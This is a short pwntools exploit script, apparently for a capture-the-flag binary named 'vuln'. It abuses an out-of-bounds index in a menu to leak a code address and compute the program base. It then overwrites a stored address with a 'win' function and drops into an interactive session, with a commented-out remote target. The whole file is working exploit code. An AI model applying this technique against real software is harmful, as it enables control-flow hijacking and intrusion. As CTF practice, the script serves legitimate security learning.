#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./vuln',checksec=False)
context.terminal = ["alacritty", "-e"]
p = process(exe.path)
# p = remote('eth007.me',42055)

gdb.attach(p,gdbscript='''
   b*main+249
   b*main+275
   b*main+457
   c
   ''')
input()

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'idx: ', b'-5')
leak=int(p.recvline(),16)
base=leak - 0x1208
win=base + 0x11e9
log.info("leak: " +hex(leak))
log.info("base:" + hex(base))
log.info("win:" + hex(win))


p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'idx: ', b'19')
p.sendlineafter(b'value: ', str(win+5).encode())
p.sendlineafter(b'> ', b'3')


p.interactive()
